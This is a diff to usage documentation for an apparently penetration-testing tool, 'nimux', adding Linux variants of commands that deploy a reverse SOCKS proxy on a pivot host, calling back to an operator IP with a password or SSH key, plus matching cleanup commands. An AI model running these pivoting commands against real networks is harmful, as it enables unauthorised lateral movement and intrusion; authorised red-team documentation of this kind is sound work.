@@ -113,6 +113,12 @@ Deploy reverse SOCKS after explicit approval:
 ```bash
 nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
   --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
+
+nimux socks <pivot-host> --linux -u <user> -p '<password>' \
+  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
+
+nimux socks <pivot-host> --linux -u <user> --ssh-key ~/.ssh/id_rsa \
+  --reverse --listener <operator-ip> --socks-port 1080 --control-port 1081
 ```
 
 Then route `nimux` commands through it:
@@ -137,11 +143,16 @@ task name
 remote helper path
 ```
 
+For Linux pivots, `task name` is usually empty. Cleanup relies on `pid` and `remote helper path`.
+
 Cleanup:
 
 ```bash
 nimux socks <pivot-host> -u <admin> -p '<password>' -d <domain> \
   --kill --pid <pid> --socks-task <task-name> --remote <remote-helper-path>
+
+nimux socks <pivot-host> --linux -u <user> -p '<password>' \
+  --kill --pid <pid> --remote <remote-helper-path>
 ```
 
 ## Redaction
